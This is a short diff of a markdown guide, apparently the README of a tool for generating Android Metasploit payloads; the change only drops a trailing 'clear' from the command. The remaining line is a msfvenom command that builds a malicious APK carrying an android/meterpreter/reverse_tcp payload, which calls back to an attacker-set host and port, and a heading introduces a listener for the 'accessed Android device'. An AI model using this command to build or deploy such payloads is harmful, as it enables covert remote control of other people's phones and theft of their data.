@@ -3,7 +3,7 @@
 # Android payload Generating Metasploit.....!
 
 ```
-msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$port -o  $name.apk && clear
+msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$port -o  $name.apk
 ```
 
 # payload listener ( For listening to the accessed Android device)
